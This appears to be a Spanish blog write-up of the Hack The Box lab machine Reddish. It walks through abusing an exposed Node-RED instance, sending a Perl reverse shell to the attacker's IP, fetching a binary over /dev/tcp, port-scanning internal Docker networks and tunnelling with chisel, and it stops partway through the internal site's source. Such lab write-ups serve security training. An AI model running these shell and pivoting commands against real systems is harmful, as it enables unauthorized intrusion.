<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Retirada Reddish de Hack The Box (Necesario VIP) | Blog de Hacking</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Maquina Retirada Reddish de Hack The Box (Necesario VIP)" />
<meta name="author" content="K0Hack" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH" />
<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH" />
<link rel="canonical" href="http://localhost:4000/2021/07/01/Reddish.html" />
<meta property="og:url" content="http://localhost:4000/2021/07/01/Reddish.html" />
<meta property="og:site_name" content="Blog de Hacking" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-07-01T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Maquina Retirada Reddish de Hack The Box (Necesario VIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K0Hack"},"dateModified":"2021-07-01T00:00:00-03:00","datePublished":"2021-07-01T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH","headline":"Maquina Retirada Reddish de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/07/01/Reddish.html"},"url":"http://localhost:4000/2021/07/01/Reddish.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Blog de Hacking" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blog de Hacking<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="" class="author-avatar" alt="Avatar" />
    
Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.

</div>


<div class="post">
  <h1 class="post-title">Maquina  Retirada Reddish de Hack The Box (Necesario VIP)</h1>
  
  <div class="post-tags">
     
      <a class="tag" href="/tag/HTB,/">HTB,</a>
      
      <a class="tag" href="/tag/Pivoting,/">Pivoting,</a>
      
      <a class="tag" href="/tag/eCPPT,/">eCPPT,</a>
      
      <a class="tag" href="/tag/chisel,/">chisel,</a>
      
      <a class="tag" href="/tag/socat,/">socat,</a>
      
      <a class="tag" href="/tag/rsync,/">rsync,</a>
      
      <a class="tag" href="/tag/bashscript,/">bashscript,</a>
      
      <a class="tag" href="/tag/redis-cli,/">redis-cli,</a>
      
      <a class="tag" href="/tag/Node-Red,/">Node-Red,</a>
      
      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
      
      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
      
      <a class="tag" href="/tag/Writeup/">Writeup</a>
      
  </div>
  
  <div class="post-date">Published on 01 Jul 2021</div>
  
  <noscript>
    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada REDDISH</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h1 id="reddish--pivoting--hack-the-box">Reddish ~ Pivoting ~ Hack The Box</h1>

<p>Realizamos el Primer escaneo con Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.94       "</span>
</code></pre></div></div>
<p>Procedemos con el siguiente escaneo de Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
</code></pre></div></div>
<p>Probamos a hechar un vistazo a la web y vemos que nos pone lo siguiente:
<code class="language-plaintext highlighter-rouge">Can not GET.</code></p>

<p>Procedemos a usar el comando <code class="language-plaintext highlighter-rouge">curl</code>para hacer una peticion por el <code class="language-plaintext highlighter-rouge">metodo POST</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># curl -X POST "http://10.10.10.94:1880"                                      </span>
<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"889671fb6a1a1ce0a10677b25be4eef8"</span>,<span class="s2">"ip"</span>:<span class="s2">"::ffff:10.10.14.12"</span>,<span class="s2">"path"</span>:<span class="s2">"/red/{id}"</span><span class="o">}</span>
</code></pre></div></div>
<p>Hacemos lo que nos indica: 
Usamos Firefox para de nuevo chequear a donde nos lleva la ruta que nos indican -&gt; <code class="language-plaintext highlighter-rouge">http://10.10.10.94:1880/red/889671fb6a1a1ce0a10677b25be4eef8</code></p>

<h1 id="node-red">Node-RED</h1>
<p>Nos abre una session de Node-Red - Que es Node-RED? <a href="url">https://gruposinelec.com/que-es-node-red-y-para-que-sirve/</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Node-RED"</span> es una herramienta de <span class="s2">"programación visual"</span> que se implementa en dispositivos controladores de hardware. Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. 
Es un <span class="s2">"panel de flow al que se pueden incorporar nodos que se comuniquen entre ellos"</span> y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube.
</code></pre></div></div>
<p>Procedemos a buscar por <code class="language-plaintext highlighter-rouge">INPUT</code> &amp; <code class="language-plaintext highlighter-rouge">OUTPUT</code>, y selecionamos respectivamente para los dos, los nodos <code class="language-plaintext highlighter-rouge">TCP</code>/INPUT &amp; <code class="language-plaintext highlighter-rouge">TCP</code>/OUTPUT.</p>
<ul>
  <li>El siguiente paso seria buscar por la funcion <code class="language-plaintext highlighter-rouge">EXEC</code> colocandola entre los dos nodos <code class="language-plaintext highlighter-rouge">TCP output &amp; TCP input</code> 
  Procedemos a conetar los nodos de la siguiente forma <code class="language-plaintext highlighter-rouge">TCP INPUT</code>~<code class="language-plaintext highlighter-rouge">EXEC</code>~<code class="language-plaintext highlighter-rouge">TCP OUTPUT</code> para que justo ahora procedamos a setear los valores en los nodos <code class="language-plaintext highlighter-rouge">TCP INPUT Y OUTPUT</code>.
  Para <code class="language-plaintext highlighter-rouge">TCP_INPUT</code>: metemos nuestra <code class="language-plaintext highlighter-rouge">IP</code>+ <code class="language-plaintext highlighter-rouge">PUERTO</code> y seleccionamos el valor <code class="language-plaintext highlighter-rouge">TYPE</code> de la siguiente forma: <code class="language-plaintext highlighter-rouge">CONNECT TO $PORT</code> &amp; <code class="language-plaintext highlighter-rouge">AT HOST $IP</code><br />
  Para <code class="language-plaintext highlighter-rouge">TCP_OUTPUT</code>: Seteamos simplemente el valor <code class="language-plaintext highlighter-rouge">TYPE</code> en <code class="language-plaintext highlighter-rouge">REPLAY TO TCP</code></li>
</ul>

<h1 id="ganando-acceso-al-node-red">Ganando Acceso al Node-RED</h1>
<p>Nos ponemos a la escucha ya directamente con el comando <code class="language-plaintext highlighter-rouge">nc -vlnp 443</code> preparados para activar el boton de <code class="language-plaintext highlighter-rouge">DEPLOY</code> en el <code class="language-plaintext highlighter-rouge">NODE-RED</code> (Boton en la parte superior Derecha)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -vlnp 443                                                                                                                                                                                                1 ⚙</span>
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.94] 36216
<span class="nb">whoami
</span>root
</code></pre></div></div>
<p>Procedemos a enumerar a ver si la maquina tiene perl para lanzarnos una <code class="language-plaintext highlighter-rouge">Reverse_shell</code> en condiciones ya que vemos que a esta no se le puede hacer un tratamiento de la <code class="language-plaintext highlighter-rouge">tty</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>object Object]which perl
/usr/bin/perl
</code></pre></div></div>
<p>Vemos que efectivamente dispone de <code class="language-plaintext highlighter-rouge">perl</code> asique procedemos a enviarnos otra <code class="language-plaintext highlighter-rouge">Reverse_shell</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.10.14.12";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span> 
</code></pre></div></div>
<p>La Recibimos:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -nlvp 443         </span>
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.94] 36230
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami
root
# script /dev/null -c bash
root@nodered:/node-red# ^Z
zsh: suspended  nc -nlvp 443
                                                    
# stty raw -echo; fg                                                                                                                                                                                    148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

root@nodered:/node-red# export TERM=xterm
root@nodered:/node-red# export SHELL=bash
root@nodered:/node-red# stty rows 50 columns 212
</span></code></pre></div></div>

<p>Listamos las <code class="language-plaintext highlighter-rouge">Interfaces de Red Disponibles</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nodered:/node-red# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
17: eth1@if18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
root@nodered:/node-red# 
</code></pre></div></div>
<h1 id="mapeado-de-red">Mapeado de RED</h1>
<p>1.-Vemos que tenemos dos segmentos de Red:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Node_RED: 
            Interfaces
    Segmento 1    - 172.18.0.2
    Segmento 2    - 172.19.0.4    
</code></pre></div></div>
<p>Procedemos a montarnos un <code class="language-plaintext highlighter-rouge">Scrip en Bash</code> para listar los posibles <code class="language-plaintext highlighter-rouge">Host</code> en los <code class="language-plaintext highlighter-rouge">dos segmentos de red</code> encontrados.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">hosts</span><span class="o">=(</span><span class="s2">"172.18.0"</span> <span class="s2">"172.19.0"</span><span class="o">)</span>

<span class="k">for </span>host <span class="k">in</span> <span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+]Enumerating </span><span class="nv">$hosts</span><span class="s2">.0/24</span><span class="se">\n</span><span class="s2">"</span>
        <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
                </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 </span><span class="nv">$host</span><span class="s2">.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[*] Host: </span><span class="nv">$host</span><span class="s2">.</span><span class="nv">$i</span><span class="s2"> ACTIVE [*]"</span> &amp;
        <span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span><span class="k">done</span>
</code></pre></div></div>
<p>Ahora que ya lo tenemos construido en nuestra Maquina Kali, tenemos que pasarnolo a la maquina comprometida, y vemos que que la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> viene bastante pelada de commandos a poder ejecutar.. asique la mejor forma de proceder es en <code class="language-plaintext highlighter-rouge">codificar</code> el scrip en <code class="language-plaintext highlighter-rouge">Base64</code> para posteriormente decodificarlo en la maquina Node-RED<code class="language-plaintext highlighter-rouge"> ya que si cuenta con </code>Base64`.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Codificandolo
<span class="c"># base64 -w 0 hostsD.sh</span>
<span class="nv">IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAiICIxNzIuMTkuMCIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KCWVjaG8gLWUgIlxuWytdRW51bWVyYXRpbmcgJGhvc3RzLjAvMjRcbiIKCWZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KCQl0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxICRob3N0LiRpIiAmPi9kZXYvbnVsbCAmJiBlY2hvICJbKl0gSG9zdDogJGhvc3QuJGkgQUNUSVZFIFsqXSIgJgoJZG9uZTsgd2FpdApkb25lCg</span><span class="o">==</span>

- Decodificandolo en la Maquina Victima
root@nodered:/node-red# <span class="nb">echo</span> <span class="s2">"IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAiICIxNzIuMTkuMCIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KCWVjaG8gLWUgIlxuWytdRW51bWVyYXRpbmcgJGhvc3RzLjAvMjRcbiIKCWZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KCQl0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxICRob3N0LiRpIiAmPi9kZXYvbnVsbCAmJiBlY2hvICJbKl0gSG9zdDogJGhvc3QuJGkgQUNUSVZFIFsqXSIgJgoJZG9uZTsgd2FpdApkb25lCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> hostD.sh
</code></pre></div></div>
<p>Lo comprobamos con un <code class="language-plaintext highlighter-rouge">cat</code> y probamos a ejecutarlo tras darle privilegios con <code class="language-plaintext highlighter-rouge">chmod +x hostD.sh</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nodered:/node-red# ./hostD.sh 

<span class="o">[</span>+]Enumerating 172.18.0.0/24

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.18.0.2 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.18.0.1 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>

<span class="o">[</span>+]Enumerating 172.18.0.0/24

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.19.0.4 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.19.0.3 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.19.0.2 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Host: 172.19.0.1 ACTIVE <span class="o">[</span><span class="k">*</span><span class="o">]</span>
</code></pre></div></div>
<p>Volvemos al mapeado de Red</p>

<p># Mapeado de RED 2
 Vemos que tenemos dos segmentos de Red:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Node_RED: 
            Interfaces
    Segmento 1    - 172.18.0.2
    Segmento 2    - 172.19.0.4    

Siguientes Nuevos Hosts: 
            Interfaces
     Segmento 1   - 172.18.0.1
     Segmento 2   - 172.19.0.1 - 172.19.0.2 - 172.19.0.3
</code></pre></div></div>

<p>Vamos a proceder a modificar nuestro <code class="language-plaintext highlighter-rouge">Script en Bash</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat HostsPortsD.sh </span>
<span class="c">#!/bin/bash</span>

<span class="nv">hosts</span><span class="o">=(</span><span class="s2">"172.18.0.1"</span> <span class="s2">"172.19.0.1"</span> <span class="s2">"172.19.0.2"</span> <span class="s2">"172.19.0.3"</span><span class="o">)</span>

<span class="k">for </span>host <span class="k">in</span> <span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+]Scanning ports in </span><span class="nv">$host</span><span class="se">\n</span><span class="s2">"</span>
        <span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 10000<span class="si">)</span><span class="p">;</span> <span class="k">do
                </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/</span><span class="nv">$host</span><span class="s2">/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt; /dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Puerto: </span><span class="nv">$port</span><span class="s2"> - ABIERTO [*]"</span> &amp;
        <span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span><span class="k">done</span>
</code></pre></div></div>
<p>Hacemos el mismo procedimiento para este script y lo codificamos en base64 igual que antes</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Coding en <span class="nb">base64</span>
<span class="c"># base64 -w 0 HostsPortsD.sh</span>
IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAuMSIgIjE3Mi4xOS4wLjEiICIxNzIuMTkuMC4yIiAiMTcyLjE5LjAuMyIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KICAgICAgICBlY2hvIC1lICJcblsrXVNjYW5uaW5nIHBvcnRzIGluICRob3N0XG4iCiAgICAgICAgZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgICAgICAgICAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLyRob3N0LyRwb3J0IiAyPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXHRbKl0gUHVlcnRvOiAkcG9ydCAtIEFCSUVSVE8gWypdIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCg<span class="o">==</span>

- Decoding en <span class="nb">base64
</span>root@nodered:/node-red# <span class="nb">echo</span> <span class="s2">"IyEvYmluL2Jhc2gKCmhvc3RzPSgiMTcyLjE4LjAuMSIgIjE3Mi4xOS4wLjEiICIxNzIuMTkuMC4yIiAiMTcyLjE5LjAuMyIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KICAgICAgICBlY2hvIC1lICJcblsrXVNjYW5uaW5nIHBvcnRzIGluICRob3N0XG4iCiAgICAgICAgZm9yIHBvcnQgaW4gJChzZXEgMSAxMDAwMCk7IGRvCiAgICAgICAgICAgICAgICB0aW1lb3V0IDEgYmFzaCAtYyAiZWNobyAnJyA+IC9kZXYvdGNwLyRob3N0LyRwb3J0IiAyPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXHRbKl0gUHVlcnRvOiAkcG9ydCAtIEFCSUVSVE8gWypdIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> hostPortsD.sh
</code></pre></div></div>
<p>Lo Ejecutamos en la maquina Victima <code class="language-plaintext highlighter-rouge">Node-RED</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nodered:/node-red# ./hostPortsD.sh 

<span class="o">[</span>+]Scanning ports <span class="k">in </span>172.18.0.1             <span class="nt">---------------</span> esta no tiene sentido ya que si es un docker muy probablemte por eso tenga el mismo puerto abierto
        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Puerto: 1880 - ABIERTO <span class="o">[</span><span class="k">*</span><span class="o">]</span>

<span class="o">[</span>+]Scanning ports <span class="k">in </span>172.19.0.1             <span class="nt">----------------</span> nada

<span class="o">[</span>+]Scanning ports <span class="k">in </span>172.19.0.2             <span class="nt">----------------</span> puerto 80 abierto   
        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Puerto: 80 - ABIERTO <span class="o">[</span><span class="k">*</span><span class="o">]</span>

<span class="o">[</span>+]Scanning ports <span class="k">in </span>172.19.0.3             <span class="nt">----------------</span> puerto 6379 abierto
        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Puerto: 6379 - ABIERTO <span class="o">[</span><span class="k">*</span><span class="o">]</span>
</code></pre></div></div>

<h1 id="chisel--portforwarding">Chisel ~ PortForwarding</h1>
<ul>
  <li>Uso de <code class="language-plaintext highlighter-rouge">Chisel</code> para tunelizar los puertos de esos dos Host en nuestra maquina <code class="language-plaintext highlighter-rouge">kali</code> como <code class="language-plaintext highlighter-rouge">localhost: 127.0.0.1</code></li>
  <li>Hacemos un <code class="language-plaintext highlighter-rouge">Git Clone</code> a este repositorio<a href="url">https://github.com/jpillora/chisel</a></li>
</ul>

<p>Como nos compartimos el <code class="language-plaintext highlighter-rouge">Chisel</code>? 
Procedemos a hacer lo siguiente para compartirnoslo con <code class="language-plaintext highlighter-rouge">NETCAT</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -nlvp 444 &lt; chisel</span>
listening on <span class="o">[</span>any] 444 ...
connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.94] 34176

<span class="c"># Comprobacion</span>
<span class="c"># md5sum chisel                                                                                                                                                                 </span>
30746509fdce4adf32a5cd4e30a13327  chisel
</code></pre></div></div>
<p>En la maquina Noder-RED:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nodered:/node-red# <span class="nb">cat</span> <span class="o">&gt;</span> chisel &lt; /dev/tcp/10.10.14.12/444
root@nodered:/node-red# <span class="nb">md5sum </span>chisel 
30746509fdce4adf32a5cd4e30a13327  chisel
</code></pre></div></div>
<p>El Archivo se a pasado correctamente asique procedemos a darle permisos de Ejecucion para Posteriormente montarme un <code class="language-plaintext highlighter-rouge">reverse server</code> con <code class="language-plaintext highlighter-rouge">chisel</code> para tunelizar los puertos que desde la <code class="language-plaintext highlighter-rouge">Maquina Node-RED</code> si que llegamos a nuestro <code class="language-plaintext highlighter-rouge">Kali Atacante</code> atraves de la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code></p>
<ul>
  <li>En nuestro Kali - Uso de <code class="language-plaintext highlighter-rouge">chisel</code>:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./chisel server --reverse -p 1234                                                                                                                                       1 ⚙</span>
2021/06/15 11:02:34 server: Reverse tunnelling enabled
2021/06/15 11:02:34 server: Fingerprint ZTFw97tFy2QFC630TVcPZtloK/mbIKPVzvRsz8Usaxw<span class="o">=</span>
2021/06/15 11:02:34 server: Listening on http://0.0.0.0:1234
2021/06/15 11:06:56 server: session#1: tun: proxy#R:127.0.0.1:80<span class="o">=&gt;</span>172.18.0.1:80: Listening
2021/06/15 11:06:56 server: session#1: tun: proxy#R:127.0.0.1:6379<span class="o">=&gt;</span>172.18.0.1:6379: Listening
</code></pre></div>    </div>
  </li>
  <li>En la maquina <code class="language-plaintext highlighter-rouge">Node-RED</code> uso de <code class="language-plaintext highlighter-rouge">chisel</code>:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nodered:/tmp# ./chisel client 10.10.14.12:1234 R:127.0.0.1:80:172.19.0.2:80 R:127.0.0.1:6379:172.19.0.3:6379
2021/06/15 09:06:54 client: Connecting to ws://10.10.14.12:1234
2021/06/15 09:06:55 client: Connected <span class="o">(</span>Latency 41.53419ms<span class="o">)</span>
</code></pre></div>    </div>
    <h1 id="uso-de-nmap-a-nivel-local">Uso de Nmap a nivel local</h1>
    <p>Ahora que ya tenemos accesibles los puertos con el <code class="language-plaintext highlighter-rouge">Remote PortForwarding</code> hacemos un scaneo con nmap sobre estos puertos pàra ver la Version y Servicios a nivel de localhost
```bash</p>
    <h1 id="nmap--sc--sv--p806379-127001--------------------------------------------------------------------------------------------------------------------------------------130-">nmap -sC -sV -p80,6379 127.0.0.1                                                                                                                                      130 ⨯</h1>
    <p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 11:41 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000026s latency).</p>
  </li>
</ul>

<p>PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Reddish
6379/tcp open  redis   Redis key-value store 4.0.9</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
# Acceso a la siguiente host
- Vemos que el output de nmap nos devuelve un Servicio llamado `Redis` y su Version `4.0.9`
Una vez llegados a este punto procedemos a usar la herramienta `SEARCHSPLOIT` para buscar posibles exploits potenciales para `Redis`
```bash
# searchsploit redis  
--------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------
Redis - Replication Code Execution (Metasploit)                                                                      | linux/remote/48272.rb
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                                        | linux/remote/47195.rb
Redis 5.0 - Denial of Service                                                                                        | linux/dos/44908.txt
Redis-cli &lt; 5.0 - Buffer Overflow (PoC)                                                                              | linux/local/44904.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div></div>
<p>Vemos que nos sale un recurso que pone que es para Metasploit, asique nanai vamos a probar a buscar a nivel google
<code class="language-plaintext highlighter-rouge">redis remote command execution</code> <a href="url">https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html</a></p>

<p>Vale pues procedemos a mirar el puerto 80 del host 172.19.0.2 en nuestro localhost por el puerto 80
Vemos una web que nos pone un FORBBIDEN
Probamos a ver el codigo fuente de la pagina y vemos que nos sale dos rutas potenciales,</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span><span class="o">&gt;</span>
html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
    <span class="nb">head</span><span class="o">&gt;</span>
        &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=UTF-8"</span>/&gt;
        &lt;title&gt;Reddish&lt;/title&gt;
        &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"assets/jquery.js"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>&lt;/script&gt;
        &lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>
						<span class="si">$(</span>document<span class="si">)</span>.ready<span class="o">(</span><span class="k">function</span> <span class="o">()</span> <span class="o">{</span>
								incrCounter<span class="o">()</span><span class="p">;</span>
						    getData<span class="o">()</span><span class="p">;</span>
						<span class="o">})</span><span class="p">;</span>

						<span class="k">function </span>getData<span class="o">()</span> <span class="o">{</span>
						    <span class="nv">$.</span>ajax<span class="o">({</span>
					        url: <span class="s2">"8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits"</span>,
						        cache: <span class="nb">false</span>,
						        dataType: <span class="s2">"text"</span>,
						        success: <span class="k">function</span> <span class="o">(</span>data<span class="o">)</span> <span class="o">{</span>
											console.log<span class="o">(</span><span class="s2">"Number of hits:"</span>, data<span class="o">)</span>
						        <span class="o">}</span>,
						        error: <span class="k">function</span> <span class="o">()</span> <span class="o">{</span>
						        <span class="o">}</span>
						    <span class="o">})</span><span class="p">;</span>
						<span class="o">}</span>

						<span class="k">function </span>incrCounter<span class="o">()</span> <span class="o">{</span>
						    <span class="nv">$.</span>ajax<span class="o">({</span>
				        url: <span class="s2">"8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits"</span>,
						        cache: <span class="nb">false</span>,
						        dataType: <span class="s2">"text"</span>,
						        success: <span class="k">function</span> <span class="o">(</span>data<span class="o">)</span> <span class="o">{</span>
